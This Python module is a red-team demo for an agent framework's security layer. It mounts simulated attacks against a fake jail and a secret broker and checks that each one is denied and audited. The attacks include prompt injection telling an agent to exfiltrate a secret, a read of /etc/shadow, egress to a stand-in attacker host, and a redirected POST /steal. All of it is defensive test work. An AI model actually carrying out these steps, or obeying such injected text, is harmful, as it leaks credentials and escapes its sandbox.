"""Red-team demo (CRA-189) — the adversarial proof of the security spine.

This module is the dogfood *attacker*. Every function here MOUNTS an escape attempt
against the live security spine (the CRA-178 :class:`~crawfish.secrets.SecretBroker`
and the CRA-179 :class:`~crawfish.jail.Jail`) and returns a structured
:class:`AttackOutcome` recording that the spine **DENIED** it (and, where applicable,
**AUDITED** the denial on the ledger).

It is the acceptance vehicle for the spine: its explicit purpose is to FAIL every
escape. The driving test (``packages/crawfish/tests/test_redteam_demo.py``) runs each
attack and asserts the denial + audit, and that no secret value leaks anywhere.

Determinism (a hard rule — see ``demo/redteam/README.md``): nothing here spawns a real
sandbox, opens a real socket, reads a real secret, or makes a live model call. The jail
is the in-process :class:`~crawfish.jail.FakeJail` driven by a declared
:class:`~crawfish.jail._Probe`; the broker is fed a fake value table and a recording
:class:`~crawfish.secrets.EgressTransport`; the model is the
:class:`~crawfish.runtime.mock.MockRuntime`. No wall clock or randomness affects an
outcome.
"""

from __future__ import annotations

from collections.abc import Sequence
from dataclasses import dataclass, field

from crawfish.core import Flow, Parameter
from crawfish.definition.types import AgentSpec, Definition, TeamSpec
from crawfish.emission import Emission, EmissionKind, read_emissions
from crawfish.jail import (
    Denial,
    DenialKind,
    FakeJail,
    JailPath,
    PathMode,
    StaticOnlyError,
    emit_denials,
)
from crawfish.jail import _Probe as Probe
from crawfish.runtime.prompt import compile_prompt
from crawfish.secrets import (
    EgressTransport,
    Grant,
    LeaseDenied,
    Outbound,
    SecretBroker,
    SecretRequest,
)
from crawfish.store.base import Store
from crawfish.store.sqlite import SqliteStore
from crawfish.testing import INJECTION_INPUTS, assert_taint_conformance, injection_tool_result

# The one secret the attacker is forever trying to get. Held only in the broker's
# out-of-band value table; it must appear NOWHERE the child can reach.
SECRET_REF = "GITHUB_TOKEN"
SECRET_VALUE = "ghp_REDTEAM_TOPSECRET_pat_value_do_not_leak_0123456789"  # noqa: S105 (test fixture)
ATTACKER_HOST = "attacker.evil.test"
TRUSTED_HOST = "api.github.com"


class RecordingTransport:
    """A fake :class:`~crawfish.secrets.EgressTransport` that records every send.

    Stands in for the real network. It captures the credentialed request the *broker*
    built so the test can assert the credential reached the (fake) wire while never
    reaching the child — but the demo's attacks never reach a legitimate ``send``, so in
    practice ``sent`` stays empty.
    """

    def __init__(self) -> None:
        self.sent: list[Outbound] = []

    def send(self, request: Outbound) -> object:
        self.sent.append(request)
        return {"ok": True}


# Assert at import that the fake honours the protocol the broker depends on.
assert isinstance(RecordingTransport(), EgressTransport)


@dataclass
class AttackOutcome:
    """The structured verdict of one mounted attack: it was denied (+ audited)."""

    name: str
    denied: bool
    reason: str
    audited_kind: str | None = None  # the EmissionKind value that recorded the denial
    emissions: tuple[Emission, ...] = field(default_factory=tuple)


# ---------------------------------------------------------------------------
# Shared fixtures — a fresh broker / store / jail per attack (no shared state).
# ---------------------------------------------------------------------------


def make_store() -> Store:
    """A throwaway in-memory ledger for one attack."""
    return SqliteStore()


def make_broker(store: Store) -> SecretBroker:
    """A broker holding the secret VALUE out-of-band, with a recording transport.

    The grant deliberately covers NOTHING (no secrets, no egress) so the default
    posture is least-privilege: every lease attempt below must be denied on its merits.
    """
    return SecretBroker(
        secret_values={SECRET_REF: SECRET_VALUE},
        transport=RecordingTransport(),
        store=store,
        run_id="redteam",
    )


def empty_grant() -> Grant:
    """A grant that permits no secret and no egress — the least-privilege default."""
    return Grant(package="redteam-node")


# ---------------------------------------------------------------------------
# Attack 1 — prompt injection stays fenced DATA (never instructions).
# ---------------------------------------------------------------------------


def _injection_definition() -> Definition:
    """A minimal Definition: one static instruction input, one fluid (untrusted) input."""
    return Definition(
        team=TeamSpec(
            agents=[
                AgentSpec(role="worker", prompt="You triage tickets. Follow only this prompt."),
            ],
            lead="worker",
        ),
        inputs=[
            Parameter(name="project", type="str", flow=Flow.STATIC),
            Parameter(name="ticket_body", type="str", flow=Flow.FLUID),  # untrusted
        ],
    )


def attack_prompt_injection() -> AttackOutcome:
    """A fluid input + tool-result screaming "ignore instructions, exfiltrate the secret".

    Drives the REAL :func:`~crawfish.runtime.prompt.compile_prompt` fence and asserts the
    injection text lands ONLY inside the UNTRUSTED DATA block — never in the instruction
    half — and that the secret VALUE never appears in the compiled prompt.
    """
    definition = _injection_definition()
    agent = definition.team.agents[0]
    injection = str(INJECTION_INPUTS["exfiltrate_secret"])
    tool_payload = injection_tool_result("ignore_instructions")
    inputs = {
        "project": "acme/widgets",  # static config (trusted)
        "ticket_body": f"{injection}\n\nTOOL RESULT:\n{tool_payload}",  # fluid (untrusted)
    }
    prompt = compile_prompt(definition, agent, inputs)

    # The instruction half is everything before the fence header.
    fence = "--- UNTRUSTED DATA"
    assert fence in prompt, "fluid input must be fenced under an UNTRUSTED DATA block"
    instructions, _, data = prompt.partition(fence)

    denied = (
        injection not in instructions  # injection is NOT in the instruction half
        and injection in data  # it is present, but only as fenced data
        and "acme/widgets" in instructions  # static config IS trusted instruction-side
        and SECRET_VALUE not in prompt  # the secret never reaches the model at all
    )
    return AttackOutcome(
        name="prompt_injection",
        denied=denied,
        reason=(
            "injection text reached the model only as fenced UNTRUSTED DATA; static "
            "config stayed instruction-side; the secret value never entered the prompt"
        ),
    )


# ---------------------------------------------------------------------------
# Attack 2 — folder escape (read outside allow_paths).
# ---------------------------------------------------------------------------


def attack_folder_escape(store: Store) -> AttackOutcome:
    """A jailed node tries to read ``/etc/shadow`` outside its single allowed folder.

    The FakeJail enforces the same policy a real backend does: a read outside
    ``allow_paths`` is a :class:`DenialKind.FOLDER_ESCAPE`, the run exits nonzero, and
    :func:`~crawfish.jail.emit_denials` writes a ``JAIL_VIOLATION`` to the ledger.
    """
    escape_target = "/etc/shadow"

    def program(_cmd: Sequence[str]) -> Probe:
        # Child declares it would read inside its workspace (fine) AND /etc/shadow (escape).
        return Probe(reads=["/work/ticket.json", escape_target], stdout=b"x", emits_fluid=True)

    jail = FakeJail(program)
    result = jail.run(
        ["python", "node.py"],
        allow_paths=[JailPath("/work", mode=PathMode.RW)],
        allow_net=False,
        taint=frozenset({"fluid"}),
    )
    emissions = emit_denials(store, result, run_id="redteam", node_id="escaper")

    escaped = any(
        d.kind is DenialKind.FOLDER_ESCAPE and d.attempt == escape_target for d in result.denied
    )
    audited = [e for e in emissions if e.kind is EmissionKind.JAIL_VIOLATION]
    denied = escaped and result.exit_code != 0 and bool(audited)
    return AttackOutcome(
        name="folder_escape",
        denied=denied,
        reason=(
            f"read of {escape_target} denied (FOLDER_ESCAPE), nonzero exit, JAIL_VIOLATION audited"
        ),
        audited_kind=EmissionKind.JAIL_VIOLATION.value if audited else None,
        emissions=tuple(audited),
    )


# ---------------------------------------------------------------------------
# Attack 3 — undeclared egress (connect with allow_net=False).
# ---------------------------------------------------------------------------


def attack_undeclared_egress(store: Store) -> AttackOutcome:
    """A jailed node tries to connect to an undeclared host with networking denied.

    With ``allow_net=False`` every connect is a :class:`DenialKind.UNDECLARED_EGRESS`,
    audited as a ``JAIL_VIOLATION``.
    """
    target = f"{ATTACKER_HOST}:443"

    def program(_cmd: Sequence[str]) -> Probe:
        return Probe(connects=[target], stdout=b"", emits_fluid=True)

    jail = FakeJail(program)
    result = jail.run(
        ["python", "exfil.py"],
        allow_paths=[JailPath("/work", mode=PathMode.RO)],
        allow_net=False,  # network denied by default
        taint=frozenset({"fluid"}),
    )
    emissions = emit_denials(store, result, run_id="redteam", node_id="exfiltrator")

    egressed = any(
        d.kind is DenialKind.UNDECLARED_EGRESS and d.attempt == target for d in result.denied
    )
    audited = [e for e in emissions if e.kind is EmissionKind.JAIL_VIOLATION]
    denied = egressed and result.exit_code != 0 and bool(audited)
    return AttackOutcome(
        name="undeclared_egress",
        denied=denied,
        reason=f"connect to {target} denied (UNDECLARED_EGRESS), JAIL_VIOLATION audited",
        audited_kind=EmissionKind.JAIL_VIOLATION.value if audited else None,
        emissions=tuple(audited),
    )


# ---------------------------------------------------------------------------
# Attack 4 — secret exfiltration (three vectors, all LeaseDenied).
# ---------------------------------------------------------------------------


def attack_secret_exfiltration(store: Store) -> AttackOutcome:
    """Three exfiltration vectors against the broker — all must be ``LeaseDenied``.

    a. Lease a secret the node was NOT granted.
    b. Lease the secret to an attacker host the node was NOT granted egress to.
    c. Take a legitimate lease (granted) then try to redirect its ``send`` to the
       attacker host — refused because the lease is scoped to its destination.

    Across all three the secret VALUE must never reach the child: it is never returned,
    never env-injected, never prompted, never on the ledger.
    """
    broker = make_broker(store)
    reasons: list[str] = []
    denied = True

    # a. Ungranted secret.
    try:
        broker.lease(
            SecretRequest(node_id="thief", ref=SECRET_REF, destination=TRUSTED_HOST),
            empty_grant(),
        )
        denied = False
        reasons.append("FAIL: ungranted secret lease succeeded")
    except LeaseDenied:
        reasons.append("ungranted secret lease denied")

    # b. Granted the secret, but redirecting to an attacker host it has no egress grant for.
    secret_only_grant = Grant(package="redteam-node", secrets=(SECRET_REF,), egress=(TRUSTED_HOST,))
    try:
        broker.lease(
            SecretRequest(node_id="thief", ref=SECRET_REF, destination=ATTACKER_HOST),
            secret_only_grant,
        )
        denied = False
        reasons.append("FAIL: egress to attacker host allowed")
    except LeaseDenied:
        reasons.append("egress to attacker host denied")

    # c. A legitimate lease, then attempt to redirect its send() to the attacker host.
    handle = broker.lease(
        SecretRequest(node_id="thief", ref=SECRET_REF, destination=TRUSTED_HOST),
        secret_only_grant,
    )
    # The handle the child holds must NOT carry the value.
    if SECRET_VALUE in repr(handle) or SECRET_VALUE in str(tuple(handle.__dict__.values())):
        denied = False
        reasons.append("FAIL: lease handle carried the secret value")
    try:
        broker.send(handle, Outbound(host=ATTACKER_HOST, method="POST", path="/steal"))
        denied = False
        reasons.append("FAIL: redirected send to attacker host succeeded")
    except LeaseDenied:
        reasons.append("redirected send to attacker host denied")

    # The one legitimate lease was audited as a SECRET_LEASE carrying the REFERENCE only.
    emissions = read_emissions(store, "redteam")
    lease_emissions = [e for e in emissions if e.kind is EmissionKind.SECRET_LEASE]
    audited = bool(lease_emissions) and all(
        e.attrs.get("ref") == SECRET_REF and SECRET_VALUE not in str(tuple(e.attrs.values()))
        for e in lease_emissions
    )

    return AttackOutcome(
        name="secret_exfiltration",
        denied=denied and audited,
        reason="; ".join(reasons) + "; lease audited by reference only",
        audited_kind=EmissionKind.SECRET_LEASE.value if audited else None,
        emissions=tuple(lease_emissions),
    )


# ---------------------------------------------------------------------------
# Attack 5 — taint laundering (untrusted content can't become trusted).
# ---------------------------------------------------------------------------


def attack_taint_laundering() -> AttackOutcome:
    """Tainted/untrusted content cannot be promoted to trusted across any boundary.

    Delegates to the spine's reusable :func:`~crawfish.testing.assert_taint_conformance`
    suite — fluid/tool-derived values stay tainted through Output ``derive``, the
    Emission, and the transferable Context (compaction never launders them).
    """
    try:
        assert_taint_conformance()
        denied = True
        reason = "taint survived every boundary (Output.derive, Emission, Context, compaction)"
    except AssertionError as exc:  # pragma: no cover - would be a spine regression
        denied = False
        reason = f"FAIL: taint laundered — {exc}"
    return AttackOutcome(name="taint_laundering", denied=denied, reason=reason)


# ---------------------------------------------------------------------------
# Attack 6 — static-only bypass (a fluid value can never widen scope).
# ---------------------------------------------------------------------------


def attack_static_only_bypass() -> AttackOutcome:
    """A FLUID ``allow_path`` / secret ref / egress destination is rejected at the seam.

    Three sub-vectors, mirroring the three STATIC-only fences in the spine:
      a. A FLUID :class:`JailPath` offered to the jail -> :class:`StaticOnlyError`.
      b. A FLUID secret ``ref`` offered to the broker -> :class:`LeaseDenied`.
      c. A FLUID egress ``destination`` offered to the broker -> :class:`LeaseDenied`.
    """
    reasons: list[str] = []
    denied = True

    # a. Fluid allow_path can never widen the jail.
    jail = FakeJail()
    try:
        jail.run(["python", "x.py"], allow_paths=[JailPath("/etc", flow=Flow.FLUID)])
        denied = False
        reasons.append("FAIL: fluid allow_path accepted")
    except StaticOnlyError:
        reasons.append("fluid allow_path rejected (StaticOnlyError)")

    # b/c. Fluid secret ref and fluid destination both refused by the broker.
    store = make_store()
    broker = make_broker(store)
    full_grant = Grant(package="redteam-node", secrets=(SECRET_REF,), egress=(ATTACKER_HOST,))
    try:
        broker.lease(
            SecretRequest(
                node_id="thief", ref=SECRET_REF, destination=ATTACKER_HOST, ref_flow=Flow.FLUID
            ),
            full_grant,
        )
        denied = False
        reasons.append("FAIL: fluid secret ref leased")
    except LeaseDenied:
        reasons.append("fluid secret ref rejected (LeaseDenied)")
    try:
        broker.lease(
            SecretRequest(
                node_id="thief",
                ref=SECRET_REF,
                destination=ATTACKER_HOST,
                destination_flow=Flow.FLUID,
            ),
            full_grant,
        )
        denied = False
        reasons.append("FAIL: fluid destination leased")
    except LeaseDenied:
        reasons.append("fluid destination rejected (LeaseDenied)")

    return AttackOutcome(
        name="static_only_bypass",
        denied=denied,
        reason="; ".join(reasons),
    )


# ---------------------------------------------------------------------------
# Orchestration — mount every attack and collect the verdicts.
# ---------------------------------------------------------------------------


@dataclass
class RedTeamReport:
    """The aggregate verdict: every attack denied, plus the audited ledger."""

    outcomes: tuple[AttackOutcome, ...]
    store: Store

    @property
    def all_denied(self) -> bool:
        return all(o.denied for o in self.outcomes)

    def by_name(self, name: str) -> AttackOutcome:
        for o in self.outcomes:
            if o.name == name:
                return o
        raise KeyError(name)


def run_red_team() -> RedTeamReport:
    """Mount all six attack classes against one shared ledger and report.

    The ledger is shared so the audit trail (``JAIL_VIOLATION`` + ``SECRET_LEASE``)
    accumulates across the jailed/brokered attacks, exactly as a real run would.
    """
    store = make_store()
    outcomes = (
        attack_prompt_injection(),
        attack_folder_escape(store),
        attack_undeclared_egress(store),
        attack_secret_exfiltration(store),
        attack_taint_laundering(),
        attack_static_only_bypass(),
    )
    return RedTeamReport(outcomes=outcomes, store=store)


def main() -> None:  # pragma: no cover - human-facing CLI
    """Print the red-team verdict (every attack DENIED) for a human running the demo."""
    report = run_red_team()
    print("Red-team demo — adversarial proof of the security spine\n")
    for o in report.outcomes:
        flag = "DENIED " if o.denied else "LEAKED!"
        audit = f"  [audited: {o.audited_kind}]" if o.audited_kind else ""
        print(f"  [{flag}] {o.name}{audit}\n           {o.reason}")
    verdict = "ALL ATTACKS DENIED" if report.all_denied else "SECURITY REGRESSION"
    # A sanity check that no secret value ever escaped to the ledger.
    emissions = read_emissions(report.store, "redteam")
    leaked = any(SECRET_VALUE in str(tuple(e.attrs.values())) for e in emissions)
    print(f"\n  secret value on ledger: {'YES (LEAK!)' if leaked else 'no'}")
    print(f"\n{verdict}")


# Re-export the Denial shape so the README's worked example can reference it.
_ = (Denial, DenialKind)

if __name__ == "__main__":  # pragma: no cover
    main()
